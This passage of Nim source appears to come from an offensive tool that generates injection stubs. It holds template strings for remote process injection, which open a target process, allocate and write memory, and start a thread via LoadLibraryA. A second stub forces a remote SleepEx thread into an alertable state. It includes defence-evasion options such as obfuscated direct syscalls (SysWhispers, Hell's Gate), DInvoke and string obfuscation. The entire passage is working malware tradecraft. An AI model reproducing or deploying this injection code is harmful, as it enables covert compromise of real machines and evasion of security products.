                status = opqiwepoausdasdjl(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)

                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)

            status = oqiahsjynmxkla(tProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
            when defined(verbose):
                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
            var bytesWritten: SIZE_T

            status = oqiazasusjk(tProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")

            var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle(obf("Kernel32.dll")), obf("LoadLibraryA")));
            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,pfnThreadRtn,ds, FALSE, 0, 0, 0, NULL)
            status = zuatzuastdiasyy(tHandle)
            if(status == 0):
                return true
            else:
                return false
        else:
           
            when defined(Hellsgate):
                if getSyscall(ntOpenTable):
                    syscall = ntOpenTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtOpenProcess")

            when not defined(spawninject):
                status = NtOpenProcess(
                    &tProcess,
                    PROCESS_ALL_ACCESS, 
                    &oa, &cid         
                )
                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)

            when defined(Hellsgate):
                if getSyscall(ntAllocTable):
                    syscall = ntAllocTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

            status = NtAllocateVirtualMemory(
                tProcess, &ds, 0, &sc_size, 
                MEM_COMMIT, 
                PAGE_READWRITE)
            when defined(verbose):
                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
            var bytesWritten: SIZE_T

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

            status = NtWriteVirtualMemory(
                tProcess, 
                ds, 
                unsafeAddr friendlycode, 
                sc_size-1, 
                addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")
            
            when defined(Hellsgate):
                if getSyscall(ntProtectTable):
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")

            var oldProtect: DWORD
            var targetAddress: LPVOID = ds
            status = NtProtectVirtualMemory(
                tProcess, 
                addr targetAddress, 
                &sc_size, 
                PAGE_READONLY, 
                addr oldProtect)

            when defined(DInvoke):
                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA(obf("Kernel32.dll")), obf("LoadLibraryA")))
            else:
                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandleA(obf("Kernel32.dll")), obf("LoadLibraryA")))
            
            when defined(Hellsgate):
                if getSyscall(ntCreateTable):
                    syscall = ntCreateTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtCreateThreadEx")

            status = NtCreateThreadEx(
                &tHandle, 
                THREAD_ALL_ACCESS, 
                NULL, 
                tProcess,
                pfnThreadRtn, 
                ds, FALSE, 0, 0, 0, NULL)
            when defined(verbose):
                echo obf("[*] NtCreateThreadEx: "), toHex(status)
            status = NtClose(tHandle)

            if(status == 0):
                return true
            else:
                return false
            

"""


let RemoteForceSleepStub* = """

    proc remoteForceSleep(targetProcess: HANDLE): HANDLE =

    
        # A long Sleep time, so that for any sleep-in-between time, the thread will still be in an alertable state
        var friendlycode: array[3, char]  = [char(0xFF), char(0xFF), char(0xFF)]
        
        when defined(verbose):
            echo obf("[*] Forcing Sleep for alertable state thread in the remote process: "), targetProcess
        var tHandle: HANDLE
        var ds: LPVOID
        var status: NTSTATUS
        var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)


        when defined(SysWhispers):
            status = oqiahsjynmxkla(targetProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
            when defined(verbose):
                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
            var bytesWritten: SIZE_T

            status = oqiazasusjk(targetProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")

            var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle(obf("kernel32.dll")), obf("SleepEx")));
            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,targetProcess,pfnThreadRtn,ds, FALSE, 0, 0, 0, NULL)
            
            if(status == 0):
                return tHandle
            else:
                return 0
        else:
            when defined(Hellsgate):
                if getSyscall(ntAllocTable):
                    syscall = ntAllocTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

            status = NtAllocateVirtualMemory(
                targetProcess, &ds, 0, &sc_size, 
                MEM_COMMIT, 
                PAGE_READWRITE)
            when defined(verbose):
                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
            var bytesWritten: SIZE_T

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

            status = NtWriteVirtualMemory(
                targetProcess, 
                ds, 
                unsafeAddr friendlycode, 
                sc_size-1, 
                addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")
            
            when defined(Hellsgate):
                if getSyscall(ntProtectTable):
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
            
            var oldProtect: DWORD
            var targetAddress: LPVOID = ds
            status = NtProtectVirtualMemory(
                targetProcess, 
                addr targetAddress, 
                &sc_size, 
                PAGE_READONLY, 
                addr oldProtect)
            
            when defined(verbose):
                echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
            
            when defined(DInvoke):
                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA(obf("kernel32.dll")), obf("SleepEx")))
            else:
                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandleA(obf("kernel32.dll")), obf("SleepEx")))
            
            when defined(Hellsgate):
                if getSyscall(ntCreateTable):
                    syscall = ntCreateTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtCreateThreadEx")

            status = NtCreateThreadEx(
                &tHandle, 
                THREAD_ALL_ACCESS, 
                NULL, 
                targetProcess,
                pfnThreadRtn, 
                ds, FALSE, 0, 0, 0, NULL)
            when defined(verbose):
                echo obf("[*] NtCreateThreadEx: "), toHex(status)
            #status = NtClose(tHandle)

            if(status == 0):
                return tHandle
            else:
                return 0
            

"""